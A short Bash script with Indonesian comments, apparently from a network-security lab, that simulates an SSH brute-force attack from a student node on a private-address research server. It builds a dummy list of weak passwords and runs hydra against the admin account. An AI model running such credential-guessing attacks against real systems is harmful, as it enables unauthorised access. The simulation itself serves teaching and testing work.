#!/bin/bash
# Script simulasi SSH Brute Force
# Dijalankan dari Node Mahasiswa

TARGET="10.20.30.10"
USER="admin"
PASSLIST="passwords.txt"

# Buat dummy password list jika belum ada
if [ ! -f $PASSLIST ]; then
    echo "123456" > $PASSLIST
    echo "password" >> $PASSLIST
    echo "admin123" >> $PASSLIST
    echo "riset2024" >> $PASSLIST
    echo "rahasia" >> $PASSLIST
fi

echo "========================================="
echo "   SIMULASI SSH BRUTE FORCE (HYDRA)"
echo "   Mahasiswa -> Server Riset ($TARGET)"
echo "========================================="

echo "[*] Memulai serangan brute force SSH..."
# -l: login name
# -P: password list file
# -t: tasks (threads)
# -v: verbose
hydra -l $USER -P $PASSLIST ssh://$TARGET -t 4 -V
